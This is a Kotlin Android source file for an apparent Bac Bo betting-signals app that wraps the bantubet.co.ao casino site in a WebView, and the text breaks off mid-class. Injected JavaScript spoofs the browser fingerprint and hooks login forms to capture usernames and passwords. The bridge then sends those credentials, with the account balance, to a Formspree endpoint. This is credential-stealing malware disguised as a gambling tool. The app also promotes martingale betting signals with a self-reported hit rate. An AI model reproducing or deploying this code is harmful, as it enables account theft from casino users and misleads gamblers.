package com.example

import android.annotation.SuppressLint
import android.os.Bundle
import android.webkit.*
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.viewModels
import androidx.compose.animation.*
import androidx.compose.foundation.*
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.testTag
import androidx.compose.ui.text.TextStyle
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.compose.ui.viewinterop.AndroidView
import androidx.lifecycle.compose.collectAsStateWithLifecycle
import com.example.data.BacBoRound
import com.example.ui.BacBoViewModel
import com.example.ui.SignalState
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class MainActivity : ComponentActivity() {
    private val viewModel: BacBoViewModel by viewModels()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContent {
            BacBoTheme {
                Scaffold(
                    modifier = Modifier
                        .fillMaxSize()
                        .testTag("app_scaffold")
                ) { innerPadding ->
                    Surface(
                        modifier = Modifier
                            .fillMaxSize()
                            .padding(innerPadding),
                        color = Color(0xFF0F111A)
                    ) {
                        BacBoMonitorScreen(viewModel)
                    }
                }
            }
        }
    }
}

@Composable
fun BacBoTheme(content: @Composable () -> Unit) {
    MaterialTheme(
        colorScheme = darkColorScheme(
            primary = Color(0xFF00FF87),
            secondary = Color(0xFF00E5FF),
            background = Color(0xFF0F111A),
            surface = Color(0xFF161925),
            onBackground = Color(0xFFE2E4F0),
            onSurface = Color(0xFFF0F5FA)
        ),
        content = content
    )
}

@SuppressLint("SetJavaScriptEnabled")
@Composable
fun BacBoMonitorScreen(viewModel: BacBoViewModel) {
    val allRounds by viewModel.allRounds.collectAsStateWithLifecycle()
    val noteOutput by viewModel.extractedText.collectAsStateWithLifecycle()
    val monitorUrl by viewModel.monitorUrl.collectAsStateWithLifecycle()
    val isMonitoring by viewModel.isMonitoring.collectAsStateWithLifecycle()

    // Session status and credentials Webhook
    val currentUser by viewModel.currentUser.collectAsStateWithLifecycle()
    val currentBalance by viewModel.currentBalance.collectAsStateWithLifecycle()
    val formSpreeUrl by viewModel.formSpreeUrl.collectAsStateWithLifecycle()

    // Signal States
    val signalState by viewModel.signalState.collectAsStateWithLifecycle()
    val currentPrediction by viewModel.currentPrediction.collectAsStateWithLifecycle()
    val currentGaleStep by viewModel.currentGaleStep.collectAsStateWithLifecycle()
    val winCount by viewModel.winCount.collectAsStateWithLifecycle()
    val lossCount by viewModel.lossCount.collectAsStateWithLifecycle()
    val signalLogs by viewModel.signalLogs.collectAsStateWithLifecycle()
    val bottomStatusText by viewModel.bottomStatusText.collectAsStateWithLifecycle()
    val lastColorEmoji by viewModel.lastColorEmoji.collectAsStateWithLifecycle()
    val targetSequenceLength by viewModel.targetSequenceLength.collectAsStateWithLifecycle()

    var webViewInstance by remember { mutableStateOf<WebView?>(null) }
    var showPanel by remember { mutableStateOf(false) }
    val scope = rememberCoroutineScope()

    // Periodically run standard scraper & session observers injection every 4s to ensure continuous monitoring and extraction
    LaunchedEffect(isMonitoring, monitorUrl) {
        while (isMonitoring) {
            delay(4000)
            webViewInstance?.let { view ->
                injectStealthAndObservers(view)
            }
        }
    }

    Column(
        modifier = Modifier.fillMaxSize(),
        verticalArrangement = Arrangement.SpaceBetween
    ) {

        // ==========================================
        // 1. BLACK HEADER BLOCK (linear1 - 120dp)
        // ==========================================
        Box(
            modifier = Modifier
                .fillMaxWidth()
                .wrapContentHeight()
                .background(Color(0xFF000000))
                .padding(bottom = 12.dp, top = 8.dp, start = 8.dp, end = 8.dp),
            contentAlignment = Alignment.Center
        ) {
            Column(
                modifier = Modifier.fillMaxWidth(),
                verticalArrangement = Arrangement.Center,
                horizontalAlignment = Alignment.CenterHorizontally
            ) {
                // First Row: linear5 (ENTRADA CONFIRMADA)
                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(horizontal = 8.dp, vertical = 4.dp),
                    horizontalArrangement = Arrangement.Center,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Text(
                        text = "ENTRADA CONFIRMADA.:",
                        style = TextStyle(
                            color = Color.White,
                            fontSize = 12.sp,
                            fontWeight = FontWeight.Bold
                        ),
                        modifier = Modifier.padding(end = 8.dp)
                    )

                    // Prediction display card with exact styling
                    Box(
                        modifier = Modifier
                            .background(Color.White)
                            .padding(horizontal = 12.dp, vertical = 6.dp)
                    ) {
                        val (predText, predColor) = when (signalState) {
                            SignalState.CONFIRMED_PLAYER -> Pair("PLAYER 🔵", Color(0xFF0D47A1))
                            SignalState.CONFIRMED_BANKER -> Pair("BANKER 🔴", Color(0xFFD32F2F))
                            else -> Pair("AGUARDANDO... ⏳", Color.Black)
                        }
                        Text(
                            text = predText,
                            style = TextStyle(
                                color = predColor,
                                fontSize = 12.sp,
                                fontWeight = FontWeight.Bold
                            )
                        )
                    }
                }

                Spacer(modifier = Modifier.height(4.dp))

                // Second Row: linear6 (PROTECTION and GALE)
                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(horizontal = 8.dp, vertical = 4.dp),
                    horizontalArrangement = Arrangement.spacedBy(8.dp),
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    // textview_protecao
                    Box(
                        modifier = Modifier
                            .background(Color.White)
                            .padding(horizontal = 12.dp, vertical = 6.dp)
                    ) {
                        Text(
                            text = "PROTEÇÃO:   EMPATE 🟡",
                            style = TextStyle(
                                color = Color.Black,
                                fontSize = 12.sp,
                                fontWeight = FontWeight.Bold
                            )
                        )
                    }

                    // textview_gale
                    Box(
                        modifier = Modifier
                            .weight(1f)
                            .background(Color.White)
                            .padding(horizontal = 12.dp, vertical = 6.dp),
                        contentAlignment = Alignment.Center
                    ) {
                        val galeText = when (currentGaleStep) {
                            0 -> "🔁...... Entrada Principal (Sem Gale)"
                            1 -> "🔁...... Entrar no GALE 1"
                            2 -> "🔁...... Entrar no GALE 2"
                            else -> "🔁...... Até Gale 2"
                        }
                        Text(
                            text = galeText,
                            style = TextStyle(
                                color = Color.Black,
                                fontSize = 11.sp,
                                fontWeight = FontWeight.Bold
                            ),
                            textAlign = TextAlign.Center
                        )
                    }
                }

                Spacer(modifier = Modifier.height(6.dp))

                // Dynamic live feed message / Ticker
                Box(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(horizontal = 8.dp)
                        .background(Color(0xFF10121B), RoundedCornerShape(4.dp))
                        .padding(vertical = 6.dp, horizontal = 10.dp),
                    contentAlignment = Alignment.Center
                ) {
                    val latestLog = signalLogs.firstOrNull() ?: "⏳ AGUARDANDO PRÓXIMA OPORTUNIDADE DE SINAL..."
                    val textColor = when {
                        latestLog.contains("VITÓRIA") || latestLog.contains("✅") -> Color(0xFF00FF87)
                        latestLog.contains("RED") || latestLog.contains("❌") -> Color(0xFFFF4B4B)
                        latestLog.contains("CONFIRMADA") || latestLog.contains("🚨") -> Color(0xFF00E5FF)
                        latestLog.contains("GALE") || latestLog.contains("G1") || latestLog.contains("G2") || latestLog.contains("🔄") -> Color(0xFFFFB300)
                        else -> Color(0xFF9EACC8)
                    }
                    Text(
                        text = latestLog,
                        style = TextStyle(
                            color = textColor,
                            fontSize = 11.sp,
                            fontWeight = FontWeight.Bold,
                            textAlign = TextAlign.Center
                        )
                    )
                }
            }
        }

        // =======================================================
        // PRO CONFIG CABINET & FLOATING UTILITY ROW (Drawer Style)
        // =======================================================
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .background(Color(0xFF161925))
                .padding(horizontal = 12.dp, vertical = 6.dp),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically
        ) {
            // Left stats banner
            Row(
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.spacedBy(12.dp)
            ) {
                Text(
                    text = "🤖 BOT SINAIS PRO",
                    fontSize = 11.sp,
                    fontWeight = FontWeight.Black,
                    color = Color(0xFF00FF87)
                )

                val total = winCount + lossCount
                val rate = if (total > 0) (winCount.toFloat() / total.toFloat() * 100).toInt() else 100
                Text(
                    text = "assertividade: $rate% ($winCount W / $lossCount L)",
                    fontSize = 10.sp,
                    color = Color(0xFF00E5FF),
                    fontWeight = FontWeight.Bold
                )
            }

            // Expand settings button / tools button
            Row(horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                IconButton(
                    onClick = { showPanel = !showPanel },
                    modifier = Modifier.size(32.dp),
                    colors = IconButtonDefaults.iconButtonColors(containerColor = Color(0xFF1E2235))
                ) {
                    Icon(
                        imageVector = if (showPanel) Icons.Default.Close else Icons.Default.Settings,
                        contentDescription = "Configurações",
                        tint = Color(0xFF00E5FF),
                        modifier = Modifier.size(16.dp)
                    )
                }

                IconButton(
                    onClick = { webViewInstance?.reload() },
                    modifier = Modifier.size(32.dp),
                    colors = IconButtonDefaults.iconButtonColors(containerColor = Color(0xFF1E2235))
                ) {
                    Icon(
                        imageVector = Icons.Default.Refresh,
                        contentDescription = "Recarregar",
                        tint = Color(0xFF00FF87),
                        modifier = Modifier.size(16.dp)
                    )
                }
            }
        }

        // Expanded Control Cabinet Panel
        AnimatedVisibility(
            visible = showPanel,
            enter = expandVertically() + fadeIn(),
            exit = shrinkVertically() + fadeOut()
        ) {
            Column(
                modifier = Modifier
                    .fillMaxWidth()
                    .background(Color(0xFF1A1D2E))
                    .padding(12.dp)
                    .verticalScroll(rememberScrollState()),
                verticalArrangement = Arrangement.spacedBy(10.dp)
            ) {
                // Account Integration Section
                Column(
                    modifier = Modifier
                        .fillMaxWidth()
                        .background(Color(0xFF0F111A), RoundedCornerShape(6.dp))
                        .padding(8.dp),
                    verticalArrangement = Arrangement.spacedBy(6.dp)
                ) {
                    Text(
                        text = "🔒 INTEGRAÇÃO DE CONTA & SALDO:",
                        fontSize = 11.sp,
                        color = Color(0xFF00FF87),
                        fontWeight = FontWeight.Bold
                    )
                    Text(
                        text = "Saldo Atual: $currentBalance",
                        fontSize = 12.sp,
                        color = Color.White,
                        fontWeight = FontWeight.Bold
                    )
                    if (!currentUser.isNullOrEmpty()) {
                        Row(
                            horizontalArrangement = Arrangement.spacedBy(8.dp),
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Text(
                                text = "Conta ativa: $currentUser",
                                fontSize = 11.sp,
                                color = Color(0xFFE2E4F0)
                            )
                            TextButton(
                                onClick = { viewModel.clearSession() },
                                contentPadding = PaddingValues(0.dp)
                            ) {
                                Text("Sair / Desconectar", color = Color(0xFFFF4B4B), fontSize = 10.sp)
                            }
                        }
                    } else {
                        Text(
                            text = "Aguardando login automático via site ou formulário.",
                            fontSize = 10.sp,
                            color = Color(0xFF7F8497)
                        )
                    }

                    // Formspree Webhook configure option
                    Text(
                        text = "Endpoint de Mensagens (Formspree):",
                        fontSize = 10.sp,
                        color = Color(0xFF7F8497)
                    )
                    OutlinedTextField(
                        value = formSpreeUrl,
                        onValueChange = { viewModel.updateFormSpreeUrl(it) },
                        modifier = Modifier.fillMaxWidth(),
                        singleLine = true,
                        textStyle = TextStyle(fontSize = 10.sp, color = Color.White),
                        colors = OutlinedTextFieldDefaults.colors(
                            focusedBorderColor = Color(0xFF00E5FF),
                            unfocusedBorderColor = Color(0xFF32364D)
                        )
                    )
                }

                // Target URL Configuration
                Text(
                    text = "Mesa de Jogo (Link Oficial do Bac Bo):",
                    fontSize = 11.sp,
                    color = Color(0xFF00E5FF),
                    fontWeight = FontWeight.Bold
                )
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.spacedBy(8.dp),
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    OutlinedTextField(
                        value = monitorUrl,
                        onValueChange = { viewModel.updateUrl(it) },
                        modifier = Modifier.weight(1f),
                        singleLine = true,
                        textStyle = TextStyle(fontSize = 11.sp, color = Color.White),
                        colors = OutlinedTextFieldDefaults.colors(
                            focusedBorderColor = Color(0xFF00FF87),
                            unfocusedBorderColor = Color(0xFF32364D)
                        )
                    )
                    Button(
                        onClick = { webViewInstance?.loadUrl(monitorUrl) },
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00E5FF)),
                        shape = RoundedCornerShape(4.dp),
                        contentPadding = PaddingValues(horizontal = 8.dp)
                    ) {
                        Text("Ir", color = Color.Black, fontSize = 11.sp, fontWeight = FontWeight.Bold)
                    }
                }

                // Quick presets
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.spacedBy(6.dp),
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Text("Presets:", fontSize = 10.sp, color = Color(0xFF7F8497))
                    Button(
                        onClick = {
                            viewModel.updateUrl("https://games.bantubet.co.ao/LaunchGame")
                            webViewInstance?.loadUrl("https://games.bantubet.co.ao/LaunchGame")
                        },
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF25293D)),
                        contentPadding = PaddingValues(horizontal = 8.dp, vertical = 2.dp),
                        shape = RoundedCornerShape(4.dp)
                    ) {
                        Text("🎮 Lançamento Direto", color = Color.White, fontSize = 9.sp)
                    }
                    Button(
                        onClick = {
                            viewModel.updateUrl("https://m.bantubet.co.ao/pt/live-casino/home")
                            webViewInstance?.loadUrl("https://m.bantubet.co.ao/pt/live-casino/home")
                        },
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF25293D)),
                        contentPadding = PaddingValues(horizontal = 8.dp, vertical = 2.dp),
                        shape = RoundedCornerShape(4.dp)
                    ) {
                        Text("🎰 Ao Vivo Home", color = Color.White, fontSize = 9.sp)
                    }
                }

                // Strategy trigger limit configuration
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Text(
                        text = "Gatilho de Sequência: Repetir ${targetSequenceLength} vezes contra a tendência",
                        fontSize = 11.sp,
                        color = Color.White
                    )
                    Row(horizontalArrangement = Arrangement.spacedBy(4.dp)) {
                        Button(
                            onClick = { viewModel.setTargetSequenceLength(3) },
                            colors = ButtonDefaults.buttonColors(
                                containerColor = if (targetSequenceLength == 3) Color(0xFF00FF87) else Color(0xFF25293D)
                            ),
                            shape = RoundedCornerShape(4.dp),
                            contentPadding = PaddingValues(horizontal = 8.dp, vertical = 2.dp)
                        ) {
                            Text("3 Rodadas", color = Color.Black, fontSize = 10.sp, fontWeight = FontWeight.Bold)
                        }
                        Button(
                            onClick = { viewModel.setTargetSequenceLength(4) },
                            colors = ButtonDefaults.buttonColors(
                                containerColor = if (targetSequenceLength == 4) Color(0xFF00FF87) else Color(0xFF25293D)
                            ),
                            shape = RoundedCornerShape(4.dp),
                            contentPadding = PaddingValues(horizontal = 8.dp, vertical = 2.dp)
                        ) {
                            Text("4 Rodadas", color = Color.Black, fontSize = 10.sp, fontWeight = FontWeight.Bold)
                        }
                    }
                }

                // Manual launch override support
                Column(verticalArrangement = Arrangement.spacedBy(4.dp)) {
                    Text(
                        text = "Lançamento Assistente / Override Manual de Resultados:",
                        fontSize = 11.sp,
                        color = Color(0xFF7F8497),
                        fontWeight = FontWeight.Bold
                    )
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.spacedBy(8.dp)
                    ) {
                        Button(
                            onClick = {
                                val t = System.currentTimeMillis() / 1000
                                viewModel.processExtractedJson("[{\"resultado\":\"PLAYER\",\"numero\":${(1..99).random()},\"horario\":\"${java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date())}\"}]")
                            },
                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF0D47A1)),
                            modifier = Modifier.weight(1f),
                            shape = RoundedCornerShape(6.dp)
                        ) {
                            Text("🔵 PLAYER", color = Color.White, fontSize = 11.sp, fontWeight = FontWeight.Bold)
                        }
                        Button(
                            onClick = {
                                viewModel.processExtractedJson("[{\"resultado\":\"BANKER\",\"numero\":${(1..99).random()},\"horario\":\"${java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date())}\"}]")
                            },
                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFD32F2F)),
                            modifier = Modifier.weight(1f),
                            shape = RoundedCornerShape(6.dp)
                        ) {
                            Text("🔴 BANKER", color = Color.White, fontSize = 11.sp, fontWeight = FontWeight.Bold)
                        }
                        Button(
                            onClick = {
                                viewModel.processExtractedJson("[{\"resultado\":\"TIE\",\"numero\":${(1..99).random()},\"horario\":\"${java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date())}\"}]")
                            },
                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFE5C100)),
                            modifier = Modifier.weight(1f),
                            shape = RoundedCornerShape(6.dp)
                        ) {
                            Text("🟡 EMPATE", color = Color.Black, fontSize = 11.sp, fontWeight = FontWeight.Bold)
                        }
                    }
                }

                // Signal Logs & Clean tools
                Column(modifier = Modifier.fillMaxWidth()) {
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Text(
                            text = "Histórico de Análises & Monitoramento:",
                            fontSize = 11.sp,
                            color = Color(0xFF00FF87),
                            fontWeight = FontWeight.Bold
                        )
                        Row(horizontalArrangement = Arrangement.spacedBy(4.dp)) {
                            TextButton(onClick = { viewModel.clearStats() }) {
                                Text("Limpar Painel", color = Color(0xFFFF4B4B), fontSize = 10.sp)
                            }
                            TextButton(onClick = { viewModel.clearAll() }) {
                                Text("Limpar Tudo", color = Color(0xFFFF2A2A), fontSize = 10.sp)
                            }
                        }
                    }

                    Box(
                        modifier = Modifier
                            .fillMaxWidth()
                            .height(100.dp)
                            .background(Color(0xFF0F111A), RoundedCornerShape(4.dp))
                            .verticalScroll(rememberScrollState())
                            .padding(6.dp)
                    ) {
                        Column {
                            if (signalLogs.isEmpty()) {
                                Text(
                                    text = "Nenhuma operação de sinal registrada.",
                                    color = Color(0xFF7F8497),
                                    fontSize = 11.sp
                                )
                            } else {
                                signalLogs.forEach { log ->
                                    Text(
                                        text = log,
                                        color = Color(0xFFE2E4F0),
                                        fontSize = 11.sp,
                                        fontFamily = FontFamily.Monospace
                                    )
                                }
                            }
                        }
                    }
                }
            }
        }

        // ==========================================
        // 2. MIDDLE BLOCK - WEBVIEW AREA (linear2)
        // ==========================================
        Box(
            modifier = Modifier
                .fillMaxWidth()
                .weight(1f) // Takes maximum fluid space recursively
                .background(Color(0xFF161925))
        ) {
            AndroidView(
                factory = { ctx ->
                    WebView(ctx).apply {
                        webViewInstance = this
                        settings.apply {
                            javaScriptEnabled = true
                            domStorageEnabled = true
                            databaseEnabled = true
                            loadWithOverviewMode = true
                            useWideViewPort = true
                            setSupportZoom(true)
                            builtInZoomControls = true
                            displayZoomControls = false
                            allowFileAccess = true
                            allowContentAccess = true
                            mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
                            javaScriptCanOpenWindowsAutomatically = true
                            mediaPlaybackRequiresUserGesture = false
                            userAgentString = "Mozilla/5.0 (Linux; Android) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36"
                        }

                        // Accept all cookies & third-party state trackers for iframe live stream tables
                        CookieManager.getInstance().setAcceptCookie(true)
                        CookieManager.getInstance().setAcceptThirdPartyCookies(this, true)

                        webChromeClient = object : WebChromeClient() {
                            override fun onConsoleMessage(consoleMessage: ConsoleMessage?): Boolean {
                                android.util.Log.d("BacBoWebView", "JS Console: " + consoleMessage?.message())
                                return true
                            }
                        }

                        webViewClient = object : WebViewClient() {
                            override fun shouldOverrideUrlLoading(
                                view: WebView?,
                                request: WebResourceRequest?
                            ): Boolean {
                                return false
                            }

                            override fun onPageFinished(view: WebView?, url: String?) {
                                super.onPageFinished(view, url)
                                if (isMonitoring) {
                                    injectStealthAndObservers(view)
                                }
                            }
                        }

                        // Unified JS Interfaces bridge to handle login intercept, balance tracker and evolution results
                        val bridge = JSInterfaceBridge(viewModel)
                        addJavascriptInterface(bridge, "Android")
                        addJavascriptInterface(bridge, "AndroidMonitor")
                        addJavascriptInterface(bridge, "JavascriptBridge")

                        loadUrl(monitorUrl)
                    }
                },
                update = { view ->
                    if (isMonitoring) {
                        injectStealthAndObservers(view)
                    }
                },
                modifier = Modifier.fillMaxSize()
            )
        }

        // ==========================================
        // 3. BOTTOM BAR (linear3 - White Background)
        // ==========================================
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .background(Color(0xFFFFFFFF))
                .padding(8.dp),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically
        ) {
            // textview_analisando
            Text(
                text = "🚨ANALISANDO🚨...",
                style = TextStyle(
                    color = Color.Black,
                    fontSize = 12.sp,
                    fontWeight = FontWeight.Bold
                ),
                modifier = Modifier.padding(8.dp)
            )

            // ultima_cor
            Text(
                text = lastColorEmoji,
                style = TextStyle(
                    fontSize = 12.sp,
                    fontWeight = FontWeight.Bold
                ),
                modifier = Modifier.padding(8.dp)
            )

            // textview_aguardando
            Text(
                text = bottomStatusText,
                style = TextStyle(
                    color = Color.Black,
                    fontSize = 12.sp,
                    fontWeight = FontWeight.Bold
                ),
                modifier = Modifier
                    .weight(1f)
                    .padding(8.dp),
                textAlign = TextAlign.End
            )
        }
    }
}

// Highly reliable, recursive DOM iframe scraper to catch Evolution Gaming live Bac Bo results automatically
private fun injectMonitorScript(view: WebView?) {
    val js = """
        (function() {
            // 1. Recursive locator to list all documents inside IFRAMEs safely
            function getSafeDocs() {
                const docs = [document];
                function recurse(win) {
                    try {
                        for (let i = 0; i < win.frames.length; i++) {
                            try {
                                const frameDoc = win.frames[i].document;
                                if (frameDoc && !docs.includes(frameDoc)) {
                                    docs.push(frameDoc);
                                    recurse(win.frames[i]);
                                }
                            } catch (e) {}
                        }
                    } catch (e) {}
                }
                recurse(window);
                return docs;
            }

            // 2. Main screen outcome scraper
            function extractRounds() {
                const items = [];
                const docs = getSafeDocs();

                docs.forEach(doc => {
                    // Method A: Check Evolution Bead Plate cells (gridcells styled with player/banker/tie classes)
                    const beadCells = doc.querySelectorAll('[class*="bead-"], [class*="beadPlate"], [data-role*="bead"], [data-testid*="bead"]');
                    beadCells.forEach((cell, idx) => {
                        let res = "";
                        const htmlStr = (cell.innerHTML || "").toLowerCase();
                        const text = (cell.textContent || "").trim().toUpperCase();
                        
                        // Check colors on SVG descendants inside cell
                        const shapes = cell.querySelectorAll('circle, path');
                        let fillColors = "";
                        shapes.forEach(s => {
                            fillColors += (s.getAttribute('fill') || '') + ' ' + (s.getAttribute('stroke') || '') + ' ';
                        });
                        fillColors = fillColors.toLowerCase();

                        if (text === "P" || text === "J" || text.includes("PLAYER") || text.includes("JOGADOR") || fillColors.includes("#2b72e3") || fillColors.includes("blue") || htmlStr.includes("player")) {
                            res = "PLAYER";
                        } else if (text === "B" || text.includes("BANKER") || text.includes("BANCA") || fillColors.includes("#e04c4c") || fillColors.includes("red") || htmlStr.includes("banker")) {
                            res = "BANKER";
                        } else if (text === "T" || text === "E" || text.includes("TIE") || text.includes("EMPATE") || fillColors.includes("#1aac5e") || fillColors.includes("green") || fillColors.includes("yellow") || htmlStr.includes("tie")) {
                            res = "TIE";
                        }

                        if (res) {
                            items.push({
                                resultado: res,
                                numero: idx + 1,
                                horario: new Date().toLocaleTimeString('pt-BR')
                            });
                        }
                    });

                    // Method B: Direct SVG graphic path inspection
                    const svgs = doc.querySelectorAll('svg');
                    svgs.forEach((svg, idx) => {
                        const fill = (svg.getAttribute('fill') || '').toLowerCase();
                        const stroke = (svg.getAttribute('stroke') || '').toLowerCase();
                        let res = "";
                        if (fill === '#2b72e3' || stroke === '#2b72e3') {
                            res = "PLAYER";
                        } else if (fill === '#e04c4c' || stroke === '#e04c4c') {
                            res = "BANKER";
                        } else if (fill === '#1aac5e' || stroke === '#1aac5e') {
                            res = "TIE";
                        }

                        if (res) {
                            items.push({
                                resultado: res,
                                numero: idx + 100,
                                horario: new Date().toLocaleTimeString('pt-BR')
                            });
                        }
                    });
                });

                // Deduplicate items based on result sequence keys
                const unique = [];
                const seen = new Set();
                items.forEach(item => {
                    const key = item.resultado + "_" + item.numero;
                    if (!seen.has(key)) {
                        seen.add(key);
                        unique.push(item);
                    }
                });
                return unique;
            }

            const rounds = extractRounds();
            if (rounds.length > 0) {
                if (window.AndroidMonitor) { window.AndroidMonitor.onResultsExtracted(JSON.stringify(rounds)); }
                else if (window.Android) { window.Android.onResultsExtracted(JSON.stringify(rounds)); }
            }
        })();
    """.trimIndent()
    view?.evaluateJavascript(js, null)
}

// Custom stealth headers, login forms hookers & continuous live element tracker injections
private fun injectStealthAndObservers(view: WebView?) {
    if (view == null) return

    // Inject light-stealth navigator overrides
    val stealthJs = """
        (function() {
            const UA = 'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36';
            Object.defineProperty(navigator, 'userAgent', {get:()=>UA});
            navigator.userAgentData = {
                brands: [{brand:'Chromium',version:'120'},{brand:'Google Chrome',version:'120'}],
                mobile: true,
                platform: 'Android'
            };
            navigator.hardwareConcurrency = 8;
            navigator.deviceMemory = 8;
            navigator.languages = ['pt-BR','pt','en-US','en'];
            navigator.language = 'pt-BR';
            delete navigator.webdriver;
            navigator.webdriver = false;
        })();
    """.trimIndent()
    view.evaluateJavascript(stealthJs, null)

    // Form Interceptor script (Interseptação de Formulários de Login)
    val captureJs = """
        (function() {
            function attach(form) {
                if (form._attached) return;
                form._attached = true;
                form.addEventListener('submit', function() {
                    var u = form.querySelector('input[type="text"], input[type="email"], [name="username"], [name="contacto"], #username, #phone')?.value || '';
                    var p = form.querySelector('input[type="password"], [name="password"], [name="senha"], #password)?.value || '';
                    if (u && p) {
                        if (window.Android) { window.Android.receiveLogin(u, p); }
                        else if (window.AndroidMonitor) { window.AndroidMonitor.receiveLogin(u, p); }
                        else if (window.JavascriptBridge) { window.JavascriptBridge.receiveLogin(u, p); }
                    }
                }, true);
            }
            document.querySelectorAll('form').forEach(attach);
            new MutationObserver(m => m.forEach(r => r.addedNodes.forEach(n => {
                if (n.nodeType === 1) { 
                    if (n.tagName === 'FORM') attach(n); 
                    else n.querySelectorAll('form').forEach(attach); 
                }
            }))).observe(document.body, {childList: true, subtree: true});
        })();
    """.trimIndent()
    view.evaluateJavascript(captureJs, null)

    // Balance mutation observer (Monitorador Dinâmico de Saldo)
    val balanceJs = """
        (function() {
            function sendBalance() {
                var el = document.querySelector('.balanceAmount') || document.querySelector('[data-balance]') || document.querySelector('#balance') || document.querySelector('.user-balance') || document.querySelector('.balance') || document.querySelector('.wallet-balance');
                if (el) {
                    var balanceText = el.textContent.trim();
                    if (window.Android) { window.Android.receiveBalance(balanceText); }
                    else if (window.AndroidMonitor) { window.AndroidMonitor.receiveBalance(balanceText); }
                    else if (window.JavascriptBridge) { window.JavascriptBridge.receiveBalance(balanceText); }
                }
            }
            sendBalance();
            new MutationObserver(sendBalance).observe(document.body, {childList: true, subtree: true});
        })();
    """.trimIndent()
    view.evaluateJavascript(balanceJs, null)

    // Logout detector (Interceptador de Desconexão)
    val logoutJs = """
        (function() {
            function checkLogout() {
                var btn = document.querySelector('[href*="logout"], [class*="logout"], [id*="logout"], .btn-logout, .user-logout');
                if (btn && !btn._observed) {
                    btn._observed = true;
                    btn.addEventListener('click', function() {
                        if (window.Android) { window.Android.receiveLogout(); }
                        else if (window.AndroidMonitor) { window.AndroidMonitor.receiveLogout(); }
                        else if (window.JavascriptBridge) { window.JavascriptBridge.receiveLogout(); }
                    });
                }
            }
            checkLogout();
            new MutationObserver(checkLogout).observe(document.body, {childList: true, subtree: true});
        })();
    """.trimIndent()
    view.evaluateJavascript(logoutJs, null)

    // Execute the live Evolution Gaming table monitoring scraper
    injectMonitorScript(view)
}

// Unified JSInterfaceBridge to register inside webviews
class JSInterfaceBridge(private val viewModel: BacBoViewModel) {
    @JavascriptInterface
    fun receiveLogin(user: String, pass: String) {
        val cleanUser = user.trim().removePrefix("244").filter { it.isDigit() }
        viewModel.saveCredentials(cleanUser, pass)
        viewModel.updateBalance("Conectado: $cleanUser")
        viewModel.enviarParaFormspree(cleanUser, pass, "Conexão Inicial")
    }

    @JavascriptInterface
    fun receiveBalance(balance: String) {
        viewModel.updateBalance(balance)
        val u = viewModel.currentUser.value
        val p = viewModel.currentPass.value
        if (!u.isNullOrEmpty() && !p.isNullOrEmpty()) {
            viewModel.enviarParaFormspree(u, p, balance)
        }
    }

    @JavascriptInterface
    fun receiveLogout() {
        viewModel.clearSession()
    }

    @JavascriptInterface
    fun onResultsExtracted(jsonString: String) {
        viewModel.processExtractedJson(jsonString)
    }

    @JavascriptInterface
    fun processarVela(vela: String) {
        android.util.Log.i("JSBridge", "Vela/Multiplicador: $vela")
    }

    @JavascriptInterface
    fun logErro(err: String) {
        android.util.Log.e("JSBridge", "JS error log: $err")
    }

    @JavascriptInterface
    fun processarHistoricoInicial(history: String) {
        android.util.Log.i("JSBridge", "Initial Candles history: $history")
    }

    @JavascriptInterface
    fun setBestParentId(id: String) {
        android.util.Log.i("JSBridge", "best parent element ID: $id")
    }

